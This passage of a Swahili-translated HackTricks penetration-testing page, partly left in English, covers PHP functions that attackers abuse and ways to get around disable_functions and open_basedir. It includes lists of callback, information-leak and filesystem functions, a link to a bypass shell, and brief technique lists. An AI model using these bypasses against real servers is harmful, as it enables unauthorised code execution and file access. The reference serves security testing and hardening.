* [**Imagick 3.3.0 PHP >= 5.4**](disable\_functions-bypass-imagick-less-than-3.3.0-php-greater-than-5.4-exploit.md)
* [**PHP 5.x Shellsock**](disable\_functions-php-5.x-shellshock-exploit.md)
* [**PHP 5.2.4 ionCube**](disable\_functions-php-5.2.4-ioncube-extension-exploit.md)
* [**PHP <= 5.2.9 Windows**](disable\_functions-bypass-php-less-than-5.2.9-on-windows.md)
* [**PHP 5.2.4/5.2.5 cURL**](disable\_functions-bypass-php-5.2.4-and-5.2.5-php-curl.md)
* [**PHP 5.2.3 -Win32std**](disable\_functions-bypass-php-5.2.3-win32std-ext-protections-bypass.md)
* [**PHP 5.2 FOpen exploit**](disable\_functions-bypass-php-5.2-fopen-exploit.md)
* [**PHP 4 >= 4.2.-, PHP 5 pcntl\_exec**](disable\_functions-bypass-php-4-greater-than-4.2.0-php-5-pcntl\_exec.md)

### **Zana ya Kiotomatiki**

Kijisakinishi kifuatacho kinajaribu baadhi ya njia zilizotajwa hapa:\
[https://github.com/l3m0n/Bypass\_Disable\_functions\_Shell/blob/master/shell.php](https://github.com/l3m0n/Bypass\_Disable\_functions\_Shell/blob/master/shell.php)

## Kazi Nyingine za Kuvutia za PHP

### Orodha ya kazi ambazo zinaruhusu kuita kwa nyuma

Kazi hizi zinaruhusu kipengele cha kuita kwa nyuma ambacho kinaweza kutumika kuita kazi ya uchaguzi wa mshambuliaji. Kulingana na kazi hiyo, mshambuliaji anaweza au hawezi kuweza kupitisha parameter. Katika kesi hiyo, kazi ya kufichua habari kama phpinfo() inaweza kutumika.

[Callbacks / Callables](https://www.php.net/manual/en/language.types.callable.php)

[Orodha zifuatazo kutoka hapa](https://stackoverflow.com/questions/3115559/exploitable-php-functions)

```php
// Function => Position of callback arguments
'ob_start' => 0,
'array_diff_uassoc' => -1,
'array_diff_ukey' => -1,
'array_filter' => 1,
'array_intersect_uassoc' => -1,
'array_intersect_ukey' => -1,
'array_map' => 0,
'array_reduce' => 1,
'array_udiff_assoc' => -1,
'array_udiff_uassoc' => array(-1, -2),
'array_udiff' => -1,
'array_uintersect_assoc' => -1,
'array_uintersect_uassoc' => array(-1, -2),
'array_uintersect' => -1,
'array_walk_recursive' => 1,
'array_walk' => 1,
'assert_options' => 1,
'uasort' => 1,
'uksort' => 1,
'usort' => 1,
'preg_replace_callback' => 1,
'spl_autoload_register' => 0,
'iterator_apply' => 1,
'call_user_func' => 0,
'call_user_func_array' => 0,
'register_shutdown_function' => 0,
'register_tick_function' => 0,
'set_error_handler' => 0,
'set_exception_handler' => 0,
'session_set_save_handler' => array(0, 1, 2, 3, 4, 5),
'sqlite_create_aggregate' => array(2, 3),
'sqlite_create_function' => 2,
```

### Kufichua Taarifa

Kwa kawaida, wito wa kazi hizi siyo hatari. Lakini inaweza kuwa ni udhaifu ikiwa data yoyote inayorudi inaweza kuonekana na mshambuliaji. Ikiwa mshambuliaji anaweza kuona phpinfo(), basi bila shaka ni udhaifu.

```php
phpinfo
posix_mkfifo
posix_getlogin
posix_ttyname
getenv
get_current_user
proc_get_status
get_cfg_var
disk_free_space
disk_total_space
diskfreespace
getcwd
getlastmo
getmygid
getmyinode
getmypid
getmyuid
```

### Nyingine

In this section, we will discuss some other useful PHP functions and techniques that can be used to bypass restrictions such as `disable_functions` and `open_basedir`.

#### Bypassing `disable_functions`

The `disable_functions` directive in PHP.ini is used to disable certain functions for security reasons. However, there are ways to bypass this restriction. Here are a few techniques:

1. **Shell execution**: If the `exec` function is disabled, you can try using other functions like `system`, `passthru`, or `popen` to execute shell commands.
2. **Backticks**: Instead of using the `exec` function, you can use backticks to execute shell commands. For example, `` `ls -la` `` will execute the `ls -la` command.
3. **PHP wrappers**: PHP supports various wrappers that can be used to execute commands. For example, you can use `php://filter` or `php://input` to execute arbitrary commands.
4. **Custom functions**: If you have the ability to define custom functions, you can use them to execute commands. For example, you can define a function that uses `eval` to execute arbitrary code.

#### Bypassing `open_basedir`

The `open_basedir` directive in PHP.ini restricts the files that can be accessed by PHP scripts. However, there are ways to bypass this restriction. Here are a few techniques:

1. **Directory traversal**: If the script allows user input to specify file paths, you can try using directory traversal techniques to access files outside the restricted directory.
2. **Symlink attacks**: If the script follows symbolic links, you can create a symbolic link to a file outside the restricted directory and access it through the symlink.
3. **File inclusion vulnerabilities**: If the script includes files based on user input, you can try exploiting file inclusion vulnerabilities to include files outside the restricted directory.
4. **Race conditions**: In some cases, you can exploit race conditions to access files outside the restricted directory. This involves timing the execution of certain actions to bypass the restriction.

Remember, these techniques should only be used for educational purposes or with proper authorization. Using them without permission is illegal and unethical.

```php
extract    // Opens the door for register_globals attacks (see study in scarlet).
parse_str  // works like extract if only one argument is given.
putenv
ini_set
mail       // has CRLF injection in the 3rd parameter, opens the door for spam.
header     // on old systems CRLF injection could be used for xss or other purposes, now it is still a problem if they do a header("location: ..."); and they do not die();. The script keeps executing after a call to header(), and will still print output normally. This is nasty if you are trying to protect an administrative area.
proc_nice
proc_terminate
proc_close
pfsockopen
fsockopen
apache_child_terminate
posix_kill
posix_mkfifo
posix_setpgid
posix_setsid
posix_setuid
```

### Kazi za Mfumo wa Faili

Kulingana na RATS, kazi zote za mfumo wa faili katika php ni hatari. Baadhi ya hizo hazionekani kuwa na matumizi sana kwa mshambuliaji. Nyingine ni muhimu zaidi kuliko unavyofikiria. Kwa mfano, ikiwa allow\_url\_fopen=On, basi url inaweza kutumika kama njia ya faili, kwa hivyo wito wa copy($\_GET\['s'], $\_GET\['d']); unaweza kutumika kupakia skripti ya PHP mahali popote kwenye mfumo. Pia, ikiwa tovuti ina kasoro ambayo inaruhusu ombi kutumwa kupitia GET, kazi zote za mfumo wa faili zinaweza kutumiwa kupeleka na kushambulia mwenyeji mwingine kupitia seva yako.

**Kiongozi wa mfumo wa faili wazi**

```php
fopen
tmpfile
bzopen
gzopen
SplFileObject->__construct
```

**Andika kwenye mfumo wa faili (kwa sehemu, kwa pamoja na kusoma)**

```php
chgrp
chmod
chown
copy
file_put_contents
lchgrp
lchown
link
mkdir
move_uploaded_file
rename
rmdir
symlink
tempnam
touch
unlink
imagepng     // 2nd parameter is a path.
imagewbmp    // 2nd parameter is a path.
image2wbmp   // 2nd parameter is a path.
imagejpeg    // 2nd parameter is a path.
imagexbm     // 2nd parameter is a path.
imagegif     // 2nd parameter is a path.
imagegd      // 2nd parameter is a path.
imagegd2     // 2nd parameter is a path.
iptcembed
ftp_get
ftp_nb_get
scandir
```

**Soma kutoka kwenye mfumo wa faili**

```php
file_exists
-- file_get_contents
file
fileatime
filectime
filegroup
fileinode
filemtime
fileowner
fileperms
filesize
filetype
glob
is_dir
is_executable
is_file
is_link
is_readable
is_uploaded_file
is_writable
is_writeable
linkinfo
lstat
parse_ini_file
pathinfo
readfile
readlink
realpath
stat
gzfile
readgzfile
getimagesize
imagecreatefromgif
imagecreatefromjpeg
imagecreatefrompng
imagecreatefromwbmp
imagecreatefromxbm
imagecreatefromxpm
ftp_put
ftp_nb_put
exif_read_data
read_exif_data
exif_thumbnail
exif_imagetype
hash_file
hash_hmac_file
hash_update_file
md5_file
sha1_file
-- highlight_file
-- show_source
php_strip_whitespace
get_meta_tags
```

<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikionekana kwenye HackTricks** au **kupakua HackTricks kwa muundo wa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**swag rasmi ya PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**The PEASS Family**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
* **Jiunge na** üí¨ [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwenye** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>
